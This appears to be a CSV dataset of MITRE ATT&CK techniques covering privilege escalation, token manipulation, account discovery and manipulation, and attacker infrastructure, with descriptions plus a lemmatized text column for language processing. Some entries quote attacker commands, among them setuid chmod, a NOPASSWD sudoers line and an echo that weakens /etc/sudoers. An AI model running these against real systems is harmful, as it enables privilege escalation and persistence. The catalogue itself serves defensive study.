id,name,description,processed
T1548,Abuse Elevation Control Mechanism,Adversaries may circumvent mechanisms designed to control elevate privileges to gain higher-level permissions. Most modern systems contain native elevation control mechanisms that are intended to limit privileges that a user can perform on a machine. Authorization has to be granted to specific users in order to perform tasks that can be considered of higher risk. An adversary can perform several methods to take advantage of built-in control mechanisms in order to escalate privileges on a system.,adversary circumvent mechanism design control elevate privilege gain high level permission modern system contain native elevation control mechanism intend limit privilege user perform machine authorization grant specific user order perform task consider high risk adversary perform method advantage build control mechanism order escalate privilege system
T1548.001,Abuse Elevation Control Mechanism: Setuid and Setgid,"An adversary may abuse configurations where an application has the setuid or setgid bits set in order to get code running in a different (and possibly more privileged) user’s context. On Linux or macOS, when the setuid or setgid bits are set for an application binary, the application will run with the privileges of the owning user or group respectively. Normally an application is run in the current user’s context, regardless of which user or group owns the application. However, there are instances where programs need to be executed in an elevated context to function properly, but the user running them may not have the specific required privileges.Instead of creating an entry in the sudoers file, which must be done by root, any user can specify the setuid or setgid flag to be set for their own applications (i.e. Linux and Mac File and Directory Permissions Modification). The chmod command can set these bits with bitmasking, chmod 4777 . This will enable the setuid bit. To enable the setgid bit, chmod 2775 and chmod g+s can be used.Adversaries can use this mechanism on their own malware to make sure they're able to execute in elevated contexts in the future. This abuse is often part of a ""shell escape"" or other actions to bypass an execution environment with restricted permissions.Alternatively, adversaries may choose to find and target vulnerable binaries with the setuid or setgid bits already enabled (i.e. File and Directory Discovery). The setuid and setguid bits are indicated with an ""s"" instead of an ""x"" when viewing a file's attributes via ls -l. The find command can also be used to search for such files. For example, find / -perm +4000 2>/dev/null can be used to find files with setuid set and find / -perm +2000 2>/dev/null may be used for setgid. Binaries that have these bits set may then be abused by adversaries.",adversary abuse configuration application setuid setgid bit set order code run different possibly privileged user context linux macos setuid setgid bit set application binary application run privilege own user group respectively normally application run current user context regardless user group own application instance program need execute elevated context function properly user run specific require privilege instead create entry sudoers file root user specify setuid setgid flag set application linux mac file directory permissions modification chmod command set bit bitmasking chmod enable setuid bit enable setgid bit chmod chmod adversary use mechanism malware sure able execute elevated context future abuse shell escape action bypass execution environment restrict permission alternatively adversary choose find target vulnerable binary setuid setgid bit enable file directory discovery setuid setguid bit indicate s instead x view file attribute ls find command search file example find null find file setuid set find null setgid binary bit set abuse adversary
T1548.002,Abuse Elevation Control Mechanism: Bypass User Account Control,"Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.If the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated Component Object Model objects without prompting the user through the UAC notification box.Many methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:eventvwr.exe can auto-elevate and execute a specified binary or script.Another bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.",adversary bypass uac mechanism elevate process privilege system windows user account control uac allow program elevate privilege track integrity level range low high perform task administrator level permission possibly prompt user confirmation impact user range deny operation high enforcement allow user perform action local administrator group click prompt allow enter administrator password complete action uac protection level computer set high level certain windows program elevate privilege execute elevated component object model object prompt user uac notification box method discover bypass uac github readme page uacme contain extensive list method discover implement comprehensive list bypass additional bypass method regularly discover wild auto elevate execute specify binary script bypass possible lateral movement technique credential account administrator privilege know uac single system security mechanism privilege integrity process run system unknown remote system default high integrity
T1548.003,Abuse Elevation Control Mechanism: Sudo and Sudo Caching,"Adversaries may perform sudo caching and/or use the sudoers file to elevate privileges. Adversaries may do this to execute commands as other users or spawn processes with higher privileges.Within Linux and MacOS systems, sudo (sometimes referred to as ""superuser do"") allows users to perform commands from terminals with elevated privileges and to control who can perform these commands on the system. The sudo command ""allows a system administrator to delegate authority to give certain users (or groups of users) the ability to run some (or all) commands as root or another user while providing an audit trail of the commands and their arguments."" Since sudo was made for the system administrator, it has some useful configuration features such as a timestamp_timeout, which is the amount of time in minutes between instances of sudo before it will re-prompt for a password. This is because sudo has the ability to cache credentials for a period of time. Sudo creates (or touches) a file at /var/db/sudo with a timestamp of when sudo was last run to determine this timeout. Additionally, there is a tty_tickets variable that treats each new tty (terminal session) in isolation. This means that, for example, the sudo timeout of one tty will not affect another tty (you will have to type the password again).The sudoers file, /etc/sudoers, describes which users can run which commands and from which terminals. This also describes which commands users can run as other users or groups. This provides the principle of least privilege such that users are running in their lowest possible permissions for most of the time and only elevate to other users or permissions as needed, typically by prompting for a password. However, the sudoers file can also specify when to not prompt users for passwords with a line like user1 ALL=(ALL) NOPASSWD: ALL. Elevated privileges are required to edit this file though.Adversaries can also abuse poor configurations of these mechanisms to escalate privileges without needing the user's password. For example, /var/db/sudo's timestamp can be monitored to see if it falls within the timestamp_timeout range. If it does, then malware can execute sudo commands without needing to supply the user's password. Additional, if tty_tickets is disabled, adversaries can do this from any tty for that user.In the wild, malware has disabled tty_tickets to potentially make scripting easier by issuing echo \'Defaults !tty_tickets\' >> /etc/sudoers. In order for this change to be reflected, the malware also issued killall Terminal. As of macOS Sierra, the sudoers file has tty_tickets enabled by default.",adversary perform sudo caching use sudoer file elevate privilege adversary execute command user spawn process high privilege linux macos system sudo refer superuser allow user perform command terminal elevate privilege control perform command system sudo command allow system administrator delegate authority certain user group user ability run command root user provide audit trail command argument sudo system administrator useful configuration feature time minute instance sudo prompt password sudo ability cache credential period time sudo create touch file db sudo timestamp sudo run determine timeout additionally variable treat new tty terminal session isolation mean example sudo timeout tty affect tty type password sudoer file sudoer describe user run command terminal describe command user run user group provide principle privilege user run low possible permission time elevate user permission need typically prompt password sudoer file specify prompt user password line like nopasswd elevated privilege require edit file adversary abuse poor configuration mechanism escalate privilege need user password example db sudo timestamp monitor fall range malware execute sudo command need supply user password additional disable adversary tty user wild malware disable potentially scripting easy issue echo sudoer order change reflect malware issue killall terminal macos sierra sudoer file enable default
T1548.004,Abuse Elevation Control Mechanism: Elevated Execution with Prompt,"Adversaries may leverage the AuthorizationExecuteWithPrivileges API to escalate privileges by prompting the user for credentials. The purpose of this API is to give application developers an easy way to perform operations with root privileges, such as for application installation or updating. This API does not validate that the program requesting root privileges comes from a reputable source or has been maliciously modified. Although this API is deprecated, it still fully functions in the latest releases of macOS. When calling this API, the user will be prompted to enter their credentials but no checks on the origin or integrity of the program are made. The program calling the API may also load world writable files which can be modified to perform malicious behavior with elevated privileges.Adversaries may abuse AuthorizationExecuteWithPrivileges to obtain root privileges in order to install malicious software on victims and install persistence mechanisms.",adversary leverage authorizationexecutewithprivileges api escalate privilege prompt user credential purpose api application developer easy way perform operation root privilege application installation updating api validate program request root privilege come reputable source maliciously modify api deprecate fully function late release macos call api user prompt enter credential check origin integrity program program call api load world writable file modify perform malicious behavior elevated privilege adversary abuse authorizationexecutewithprivileges obtain root privilege order install malicious software victim install persistence mechanism
T1134,Access Token Manipulation,"Adversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls. Windows uses access tokens to determine the ownership of a running process. A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process. When this occurs, the process also takes on the security context associated with the new token.An adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing. These token can then be applied to an existing process (i.e. Token Impersonation/Theft) or used to spawn a new process (i.e. Create Process with Token). An adversary must already be in a privileged user context (i.e. administrator) to steal a token. However, adversaries commonly use token stealing to elevate their security context from the administrator level to the SYSTEM level. An adversary can then use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system.Any standard user can use the runas command, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account. There are also other mechanisms, such as Active Directory fields, that can be used to modify access tokens.",adversary modify access token operate different user system security context perform action bypass access control windows use access token determine ownership run process user manipulate access token run process appear child different process belong user start process occur process take security context associate new token adversary use build windows api function copy access token exist process know token stealing token apply exist process token impersonation theft spawn new process create process token adversary privileged user context administrator steal token adversary commonly use token stealing elevate security context administrator level system level adversary use token authenticate remote system account token account appropriate permission remote system standard user use runas command windows api function create impersonation token require access administrator account mechanism active directory field modify access token
T1134.001,Access Token Manipulation: Token Impersonation/Theft,"Adversaries may duplicate then impersonate another user's existing token to escalate privileges and bypass access controls. For example, an adversary can duplicate an existing token using DuplicateToken or DuplicateTokenEx. The token can then be used with ImpersonateLoggedOnUser to allow the calling thread to impersonate a logged on user's security context, or with SetThreadToken to assign the impersonated token to a thread.An adversary may perform Token Impersonation/Theft when they have a specific, existing process they want to assign the duplicated token to. For example, this may be useful for when the target user has a non-network logon session on the system.When an adversary would instead use a duplicated token to create a new process rather than attaching to an existing process, they can additionally Create Process with Token using CreateProcessWithTokenW or CreateProcessAsUserW. Token Impersonation/Theft is also distinct from Make and Impersonate Token in that it refers to duplicating an existing token, rather than creating a new one.",adversary duplicate impersonate user exist token escalate privilege bypass access control example adversary duplicate exist token duplicatetoken duplicatetokenex token impersonateloggedonuser allow call thread impersonate log user security context setthreadtoken assign impersonate token thread adversary perform token impersonation theft specific exist process want assign duplicate token example useful target user non network logon session system adversary instead use duplicate token create new process attach exist process additionally create process token createprocesswithtokenw token impersonation theft distinct impersonate token refer duplicate exist token create new
T1134.002,Access Token Manipulation: Create Process with Token,"Adversaries may create a new process with an existing token to escalate privileges and bypass access controls. Processes can be created with the token and resulting security context of another user using features such as CreateProcessWithTokenW and runas.Creating processes with a token not associated with the current user may require the credentials of the target user, specific privileges to impersonate that user, or access to the token to be used. For example, the token could be duplicated via Token Impersonation/Theft or created via Make and Impersonate Token before being used to create a process.While this technique is distinct from Token Impersonation/Theft, the techniques can be used in conjunction where a token is duplicated and then used to create a new process.",adversary create new process exist token escalate privilege bypass access control process create token result security context user feature createprocesswithtokenw runa create process token associate current user require credential target user specific privilege impersonate user access token example token duplicate token impersonation theft create impersonate token create process technique distinct token impersonation theft technique conjunction token duplicate create new process
T1134.003,Access Token Manipulation: Make and Impersonate Token,"Adversaries may make new tokens and impersonate users to escalate privileges and bypass access controls. For example, if an adversary has a username and password but the user is not logged onto the system the adversary can then create a logon session for the user using the LogonUser function. The function will return a copy of the new session's access token and the adversary can use SetThreadToken to assign the token to a thread.This behavior is distinct from Token Impersonation/Theft in that this refers to creating a new user token instead of stealing or duplicating an existing one.",adversary new token impersonate user escalate privilege bypass access control example adversary username password user log system adversary create logon session user logonuser function function return copy new session access token adversary use setthreadtoken assign token thread behavior distinct token impersonation theft refer create new user token instead steal duplicate exist
T1134.004,Access Token Manipulation: Parent PID Spoofing,"Adversaries may spoof the parent process identifier (PPID) of a new process to evade process-monitoring defenses or to elevate privileges. New processes are typically spawned directly from their parent, or calling, process unless explicitly specified. One way of explicitly assigning the PPID of a new process is via the CreateProcess API call, which supports a parameter that defines the PPID to use.Adversaries may abuse these mechanisms to evade defenses, such as those blocking processes spawning directly from Office documents, and analysis targeting unusual/potentially malicious parent-child process relationships, such as spoofing the PPID of PowerShell/Rundll32 to be explorer.exe rather than an Office document delivered as part of Spearphishing Attachment.Explicitly assigning the PPID may also enable elevated privileges given appropriate access rights to the parent process. For example, an adversary in a privileged user context (i.e. administrator) may spawn a new process and assign the parent as a process running as SYSTEM (such as lsass.exe), causing the new process to be elevated via the inherited access token.",adversary spoof parent process identifier ppid new process evade process monitor defense elevate privilege new process typically spawn directly parent call process explicitly specify way explicitly assign ppid new process createprocess api support parameter define ppid use adversary abuse mechanism evade defense block process spawn directly office document analysis target unusual potentially malicious parent child process relationship spoof ppid powershell office document deliver spearphishing attachment explicitly assign ppid enable elevated privilege give appropriate access right parent process example adversary privileged user context administrator spawn new process assign parent process run system cause new process elevate inherit access token
T1134.005,Access Token Manipulation: SID-History Injection,"Adversaries may use SID-History Injection to escalate privileges and bypass access controls. The Windows security identifier (SID) is a unique value that identifies a user or group account. SIDs are used by Windows security in both security descriptors and access tokens. , allowing inter-operable account migration between domains (e.g., all values in SID-History are included in access tokens).With Domain Administrator (or equivalent) rights, harvested or well-known SID values may be inserted into SID-History to enable impersonation of arbitrary users/groups such as Enterprise Administrators. This manipulation may result in elevated access to local resources and/or access to otherwise inaccessible domains via lateral movement techniques such as Remote Services, SMB/Windows Admin Shares, or Windows Remote Management.",adversary use sid history injection escalate privilege bypass access control windows security identifier sid unique value identify user group account sids windows security security descriptor access token allow inter operable account migration domain value sid history include access domain administrator equivalent right harvest know sid value insert sid history enable impersonation arbitrary user group enterprise administrators manipulation result elevated access local resource access inaccessible domain lateral movement technique remote services smb windows admin shares windows remote management
T1531,Account Access Removal,"Adversaries may interrupt availability of system and network resources by inhibiting access to accounts utilized by legitimate users. Accounts may be deleted, locked, or manipulated (ex: changed credentials) to remove access to accounts. Adversaries may also subsequently log off and/or perform a System Shutdown/Reboot to set malicious changes into place.In Windows, Net utility, Set-LocalUser and Set-ADAccountPassword PowerShell cmdlets may be used by adversaries to modify user accounts. In Linux, the passwd utility may be used to change passwords. Accounts could also be disabled by Group Policy. Adversaries who use ransomware or similar attacks may first perform this and other Impact behaviors, such as Data Destruction and Defacement, in order to impede incident response/recovery before completing the Data Encrypted for Impact objective.",adversary interrupt availability system network resource inhibit access account utilize legitimate user account delete lock manipulate ex change credential remove access account adversary subsequently log perform system shutdown reboot set malicious change place windows net utility set localuser set adaccountpassword powershell cmdlet adversary modify user account linux passwd utility change password account disable group policy adversary use ransomware similar attack perform impact behavior data destruction defacement order impede incident response recovery complete data encrypt impact objective
T1087,Account Discovery,"Adversaries may attempt to get a listing of valid accounts, usernames, or email addresses on a system or within a compromised environment. This information can help adversaries determine which accounts exist, which can aid in follow-on behavior such as brute-forcing, spear-phishing attacks, or account takeovers (e.g., Valid Accounts).Adversaries may use several methods to enumerate accounts, including abuse of existing tools, built-in commands, and potential misconfigurations that leak account names and roles or permissions in the targeted environment.For examples, cloud environments typically provide easily accessible interfaces to obtain user lists. On hosts, adversaries can use default PowerShell and other command line functionality to identify accounts. Information about email addresses and accounts may also be extracted by searching an infected system’s files.",adversary attempt listing valid account username email address system compromised environment information help adversary determine account exist aid follow behavior brute force spear phishing attack account takeover valid use method enumerate account include abuse exist tool build command potential misconfiguration leak account name role permission target environment example cloud environment typically provide easily accessible interface obtain user list host adversary use default powershell command line functionality identify account information email address account extract search infected system file
T1087.001,Account Discovery: Local Account,"Adversaries may attempt to get a listing of local system accounts. This information can help adversaries determine which local accounts exist on a system to aid in follow-on behavior.Commands such as net user and net localgroup of the Net utility and id and groupson macOS and Linux can list local users and groups. On Linux, local users can also be enumerated through the use of the /etc/passwd file. On macOS the dscl . list /Users command can be used to enumerate local accounts.",adversary attempt listing local system account information help adversary determine local account exist system aid follow behavior command net user net localgroup net utility d groupson macos linux list local user group linux local user enumerate use passwd file macos dscl list command enumerate local account
T1087.002,Account Discovery: Domain Account,"Adversaries may attempt to get a listing of domain accounts. This information can help adversaries determine which domain accounts exist to aid in follow-on behavior such as targeting specific accounts which possess particular privileges.Commands such as net user /domain and net group /domain of the Net utility, dscacheutil -q groupon macOS, and ldapsearch on Linux can list domain users and groups. PowerShell cmdlets including Get-ADUser and Get-ADGroupMember may enumerate members of Active Directory groups.",adversary attempt listing domain account information help adversary determine domain account exist aid follow behavior target specific account possess particular privilege command net user net group net utility dscacheutil groupon macos ldapsearch linux list domain user group powershell cmdlet include aduser adgroupmember enumerate member active directory group
T1087.003,Account Discovery: Email Account,"Adversaries may attempt to get a listing of email addresses and accounts. Adversaries may try to dump Exchange address lists such as global address lists (GALs).In on-premises Exchange and Exchange Online, theGet-GlobalAddressList PowerShell cmdlet can be used to obtain email addresses and accounts from a domain using an authenticated session.In Google Workspace, the GAL is shared with Microsoft Outlook users through the Google Workspace Sync for Microsoft Outlook (GWSMO) service. Additionally, the Google Workspace Directory allows for users to get a listing of other users within the organization.",adversary attempt listing email address account adversary try dump exchange address list global address list premise exchange exchange online theget globaladdresslist powershell cmdlet obtain email address account domain authenticate session google workspace gal share microsoft outlook user google workspace sync microsoft outlook gwsmo service additionally google workspace directory allow user listing user organization
T1087.004,Account Discovery: Cloud Account,"Adversaries may attempt to get a listing of cloud accounts. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application.With authenticated access there are several tools that can be used to find accounts. The Get-MsolRoleMember PowerShell cmdlet can be used to obtain account names given a role or permissions group in Office 365. The AWS command aws iam list-users may be used to obtain a list of users in the current account while aws iam list-roles can obtain IAM roles that have a specified path prefix.",adversary attempt listing cloud account cloud account create configure organization use user remote support service administration resource cloud service provider saas application authenticated access tool find account msolrolemember powershell cmdlet obtain account name give role permission group office aws command aws iam list user obtain list user current account aws iam list role obtain iam role specify path prefix
T1098,Account Manipulation,"Adversaries may manipulate accounts to maintain access to victim systems. Account manipulation may consist of any action that preserves adversary access to a compromised account, such as modifying credentials or permission groups. These actions could also include account activity designed to subvert security policies, such as performing iterative password updates to bypass password duration policies and preserve the life of compromised credentials. In order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain. However, account manipulation may also lead to privilege escalation where modifications grant access to additional roles, permissions, or higher-privileged Valid Accounts.",adversary manipulate account maintain access victim system account manipulation consist action preserve adversary access compromise account modify credential permission group action include account activity design subvert security policy perform iterative password update bypass password duration policy preserve life compromise credential order create manipulate account adversary sufficient permission system domain account manipulation lead privilege escalation modification grant access additional role permission higher privileged valid accounts
T1098.001,Account Manipulation: Additional Cloud Credentials,"Adversaries may add adversary-controlled credentials to a cloud account to maintain persistent access to victim accounts and instances within the environment.For example, adversaries may add credentials for Service Principals and Applications in addition to existing legitimate credentials in Azure AD.In infrastructure-as-a-service (IaaS) environments, after gaining access through Cloud Accounts, adversaries may generate or import their own SSH keys using either the CreateKeyPair or ImportKeyPair API in AWS or the gcloud compute os-login ssh-keys add command in GCP.Adversaries may also use the CreateAccessKey API in AWS or the gcloud iam service-accounts keys create command in GCP to add access keys to an account. If the target account has different permissions from the requesting account, the adversary may also be able to escalate their privileges in the environment (i.e. Cloud Accounts).In AWS environments, adversaries with the appropriate permissions may also use the sts:GetFederationToken API call to create a temporary set of credentials tied to the permissions of the original user account. These credentials may remain valid for the duration of their lifetime even if the original account’s API credentials are deactivated.",adversary add adversary control credential cloud account maintain persistent access victim account instance environment example adversary add credential service principals application addition exist legitimate credential azure infrastructure service iaas environment gain access cloud accounts adversary generate import ssh key createkeypair importkeypair api aws gcloud compute os login ssh key add command use createaccesskey api aws gcloud iam service account key create command gcp add access key account target account different permission request account adversary able escalate privilege environment cloud aws environment adversary appropriate permission use sts getfederationtoken api create temporary set credential tie permission original user account credential remain valid duration lifetime original account api credential deactivate
T1098.002,Account Manipulation: Additional Email Delegate Permissions,"Adversaries may grant additional permission levels to maintain persistent access to an adversary-controlled email account. For example, the Add-MailboxPermission PowerShell cmdlet, available in on-premises Exchange and in the cloud-based service Office 365, adds permissions to a mailbox. Adversaries may also assign mailbox folder permissions through individual folder permissions or roles. In Office 365 environments, adversaries may assign the Default or Anonymous user permissions or roles to the Top of Information Store (root), Inbox, or other mailbox folders. By assigning one or both user permissions to a folder, the adversary can utilize any other account in the tenant to maintain persistence to the target user’s mail folders.This may be used in persistent threat incidents as well as BEC (Business Email Compromise) incidents where an adversary can add Additional Cloud Roles to the accounts they wish to compromise. This may further enable use of additional techniques for gaining access to systems. For example, compromised business accounts are often used to send messages to other accounts in the network of the target business while creating inbox rules (ex: Internal Spearphishing), so the messages evade spam/phishing detection mechanisms.",adversary grant additional permission level maintain persistent access adversary control email account example add mailboxpermission powershell cmdlet available premise exchange cloud base service office add permission mailbox adversary assign mailbox folder permission individual folder permission role office environment adversary assign default anonymous user permission role information store root inbox mailbox folder assign user permission folder adversary utilize account tenant maintain persistence target user mail folder persistent threat incident bec business email compromise incident adversary add additional cloud role account wish compromise enable use additional technique gain access system example compromise business account send message account network target business create inbox rule ex internal spearphishing message evade spam phishing detection mechanism
T1098.003,Account Manipulation: Additional Cloud Roles,"An adversary may add additional roles or permissions to an adversary-controlled cloud account to maintain persistent access to a tenant. For example, adversaries may update IAM policies in cloud-based environments or add a new global administrator in Office 365 environments. This account modification may immediately follow Create Account or other malicious account activity. Adversaries may also modify existing Valid Accounts that they have compromised. This could lead to privilege escalation, particularly if the roles added allow for lateral movement to additional accounts.For example, in Azure AD environments, an adversary with the Application Administrator role can add Additional Cloud Credentials to their application's service principal. In doing so the adversary would be able to gain the service principal’s roles and permissions, which may be different from those of the Application Administrator.Similarly, an adversary with the Azure AD Global Administrator role can toggle the ""Access management for Azure resources"" option to gain the ability to assign privileged access to Azure subscriptions and virtual machines to Azure AD users, including themselves.",adversary add additional role permission adversary control cloud account maintain persistent access tenant example adversary update iam policy cloud base environment add new global administrator office environment account modification immediately follow create account malicious account activity adversary modify exist valid accounts compromise lead privilege escalation particularly role add allow lateral movement additional account example azure ad environment adversary application administrator role add additional cloud credentials application service principal adversary able gain service principal role permission different application administrator similarly adversary azure ad global administrator role toggle access management azure resource option gain ability assign privileged access azure subscription virtual machine azure ad user include
T1098.004,Account Manipulation: SSH Authorized Keys,"Adversaries may modify the SSH authorized_keys file to maintain persistence on a victim host. Linux distributions and macOS commonly use key-based authentication to secure the authentication process of SSH sessions for remote management. The authorized_keys file in SSH specifies the SSH keys that can be used for logging into the user account for which the file is configured. This file is usually found in the user's home directory under <user-home>/.ssh/authorized_keys. Users may edit the system’s SSH config file to modify the directives PubkeyAuthentication and RSAAuthentication to the value ""yes"" to ensure public key and RSA authentication are enabled. The SSH config file is usually located under /etc/ssh/sshd_config.Adversaries may modify SSH authorized_keys files directly with scripts or shell commands to add their own adversary-supplied public keys. In cloud environments, adversaries may be able to modify the SSH authorized_keys file of a particular virtual machine via the command line interface or rest API. For example, by using the Google Cloud CLI’s ""add-metadata"" command an adversary may add SSH keys to a user account. Where authorized_keys files are modified via cloud APIs or command line interfaces, an adversary may achieve privilege escalation on the target virtual machine if they add a key to a higher-privileged user. SSH keys can also be added to accounts on network devices, such as with the ip ssh pubkey-chain Network Device CLI command.",adversary modify ssh file maintain persistence victim host linux distribution macos commonly use key base authentication secure authentication process ssh session remote management file ssh specify ssh key log user account file configure file usually find user home directory user user edit system ssh config file modify directive pubkeyauthentication rsaauthentication value yes ensure public key rsa authentication enable ssh config file usually locate ssh adversary modify ssh file directly script shell command add adversary supply public key cloud environment adversary able modify ssh file particular virtual machine command line interface rest api example google cloud cli add metadata command adversary add ssh key user account file modify cloud api command line interface adversary achieve privilege escalation target virtual machine add key higher privileged user ssh key add account network device ip ssh pubkey chain network device cli command
T1098.005,Account Manipulation: Device Registration,"Adversaries may register a device to an adversary-controlled account. Devices may be registered in a multifactor authentication (MFA) system, which handles authentication to the network, or in a device management system, which handles device access and compliance.MFA systems, such as Duo or Okta, allow users to associate devices with their accounts in order to complete MFA requirements. An adversary that compromises a user’s credentials may enroll a new device in order to bypass initial MFA requirements and gain persistent access to a network.Similarly, an adversary with existing access to a network may register a device to Azure AD and/or its device management system, Microsoft Intune, in order to access sensitive data or resources while bypassing conditional access policies. Devices registered in Azure AD may be able to conduct Internal Spearphishing campaigns via intra-organizational emails, which are less likely to be treated as suspicious by the email client.",adversary register device adversary control account device register multifactor authentication mfa system handle authentication network device management system handle device access compliance mfa system duo okta allow user associate device account order complete mfa requirement adversary compromise user credential enroll new device order bypass initial mfa requirement gain persistent access network similarly adversary exist access network register device azure ad device management system microsoft intune order access sensitive datum resource bypass conditional access policy device register azure ad able conduct internal spearphishing campaign intra organizational email likely treat suspicious email client
T1650,Acquire Access,"Adversaries may purchase or otherwise acquire an existing access to a target system or network. A variety of online services and initial access broker networks are available to sell access to previously compromised systems.Footholds to compromised systems may take a variety of forms, such as access to planted backdoors (e.g., Web Shell) or established access via External Remote Services. In some cases, access brokers will implant compromised systems with a ""load"" that can be used to install additional malware for paying customers.By leveraging existing access broker networks rather than developing or obtaining their own initial access capabilities, an adversary can potentially reduce the resources required to gain a foothold on a target network and focus their efforts on later stages of compromise. Adversaries may prioritize acquiring access to systems that have been determined to lack security monitoring or that have high privileges, or systems that belong to organizations in a particular sector.In some cases, purchasing access to an organization in sectors such as IT contracting, software development, or telecommunications may allow an adversary to compromise additional victims via a Trusted Relationship, Multi-Factor Authentication Interception, or even Supply Chain Compromise.Note: while this technique is distinct from other behaviors such as Purchase Technical Data and Credentials, they may often be used in conjunction (especially where the acquired foothold requires Valid Accounts).",adversary purchase acquire exist access target system network variety online service initial access broker network available sell access previously compromised system foothold compromise system variety form access plant backdoor web shell establish access external remote services case access broker implant compromise system load install additional malware pay customer leverage exist access broker network develop obtain initial access capability adversary potentially reduce resource require gain foothold target network focus effort later stage compromise adversary prioritize acquire access system determine lack security monitoring high privilege system belong organization particular sector case purchase access organization sector contracting software development telecommunication allow adversary compromise additional victim trust relationship multi factor authentication interception supply chain compromise note technique distinct behavior purchase technical datum credential conjunction especially acquire foothold require valid account
T1583,Acquire Infrastructure,"Adversaries may buy, lease, or rent infrastructure that can be used during targeting. A wide variety of infrastructure exists for hosting and orchestrating adversary operations. Infrastructure solutions include physical or cloud servers, domains, and third-party web services. Additionally, botnets are available for rent or purchase.Use of these infrastructure solutions allows adversaries to stage, launch, and execute operations. Solutions may help adversary operations blend in with traffic that is seen as normal, such as contacting third-party web services or acquiring infrastructure to support Proxy. Depending on the implementation, adversaries may use infrastructure that makes it difficult to physically tie back to them as well as utilize infrastructure that can be rapidly provisioned, modified, and shut down.",adversary buy lease rent infrastructure targeting wide variety infrastructure exist host orchestrate adversary operation infrastructure solution include physical cloud server domain party web service additionally botnet available rent purchase use infrastructure solution allow adversary stage launch execute operation solution help adversary operation blend traffic see normal contact party web service acquire infrastructure support proxy depend implementation adversary use infrastructure make difficult physically tie utilize infrastructure rapidly provision modify shut
T1583.001,Acquire Infrastructure: Domains,"Adversaries may acquire domains that can be used during targeting. Domain names are the human readable names used to represent one or more IP addresses. They can be purchased or, in some cases, acquired for free.Adversaries may use acquired domains for a variety of purposes, including for Phishing, Drive-by Compromise, and Command and Control.Adversaries may also acquire and repurpose expired domains, which may be potentially already allowlisted/trusted by defenders based on an existing reputation/history.Domain registrars each maintain a publicly viewable database that displays contact information for every registered domain. Private WHOIS services display alternative information, such as their own company data, rather than the owner of the domain. Adversaries may use such private WHOIS services to obscure information about who owns a purchased domain. Adversaries may further interrupt efforts to track their infrastructure by using varied registration information and purchasing domains with different domain registrars.",adversary acquire domain targeting domain name human readable name represent ip address purchase case acquire free adversary use acquire domain variety purpose include phishing drive compromise command control adversary acquire repurpose expire domain potentially allowliste trust defender base exist reputation history domain registrar maintain publicly viewable database display contact information register domain private whois service display alternative information company datum owner domain adversary use private whois service obscure information own purchase domain adversary interrupt effort track infrastructure varied registration information purchase domain different domain registrar
T1583.002,Acquire Infrastructure: DNS Server,"Adversaries may set up their own Domain Name System (DNS) servers that can be used during targeting. During post-compromise activity, adversaries may utilize DNS traffic for various tasks, including for Command and Control (ex: Application Layer Protocol). Instead of hijacking existing DNS servers, adversaries may opt to configure and run their own DNS servers in support of operations.By running their own DNS servers, adversaries can have more control over how they administer server-side DNS C2 traffic (DNS). With control over a DNS server, adversaries can configure DNS applications to provide conditional responses to malware and, generally, have more flexibility in the structure of the DNS-based C2 channel.",adversary set domain system dns server targeting post compromise activity adversary utilize dns traffic task include command control ex application layer protocol instead hijack exist dns server adversary opt configure run dns server support operation run dns server adversary control administer server dns traffic dns control dns server adversary configure dns application provide conditional response malware generally flexibility structure dns base channel
T1583.003,Acquire Infrastructure: Virtual Private Server,"Adversaries may rent Virtual Private Servers (VPSs) that can be used during targeting. There exist a variety of cloud service providers that will sell virtual machines/containers as a service. By utilizing a VPS, adversaries can make it difficult to physically tie back operations to them. The use of cloud infrastructure can also make it easier for adversaries to rapidly provision, modify, and shut down their infrastructure.Acquiring a VPS for use in later stages of the adversary lifecycle, such as Command and Control, can allow adversaries to benefit from the ubiquity and trust associated with higher reputation cloud service providers. Adversaries may also acquire infrastructure from VPS service providers that are known for renting VPSs with minimal registration information, allowing for more anonymous acquisitions of infrastructure.",adversary rent virtual private servers vpss targeting exist variety cloud service provider sell virtual machine container service utilize vps adversary difficult physically tie operation use cloud infrastructure easy adversary rapidly provision modify shut infrastructure acquire vps use later stage adversary lifecycle command control allow adversary benefit ubiquity trust associate high reputation cloud service provider adversary acquire infrastructure vps service provider know rent vps minimal registration information allow anonymous acquisition infrastructure
T1583.004,Acquire Infrastructure: Server,"Adversaries may buy, lease, or rent physical servers that can be used during targeting. Use of servers allows an adversary to stage, launch, and execute an operation. During post-compromise activity, adversaries may utilize servers for various tasks, including for Command and Control. Adversaries may use web servers to support support watering hole operations, as in Drive-by Compromise, or email servers to support Phishing operations. Instead of compromising a third-party Server or renting a Virtual Private Server, adversaries may opt to configure and run their own servers in support of operations.Adversaries may only need a lightweight setup if most of their activities will take place using online infrastructure. Or, they may need to build extensive infrastructure if they want to test, communicate, and control other aspects of their activities on their own systems.",adversary buy lease rent physical server targeting use server allow adversary stage launch execute operation post compromise activity adversary utilize server task include command control adversary use web server support support watering hole operation drive compromise email server support phishing operation instead compromise party server rent virtual private server adversary opt configure run server support operation adversary need lightweight setup activity place online infrastructure need build extensive infrastructure want test communicate control aspect activity system
T1583.005,Acquire Infrastructure: Botnet,"Adversaries may buy, lease, or rent a network of compromised systems that can be used during targeting. A botnet is a network of compromised systems that can be instructed to perform coordinated tasks.",adversary buy lease rent network compromised system targeting botnet network compromised system instruct perform coordinated task
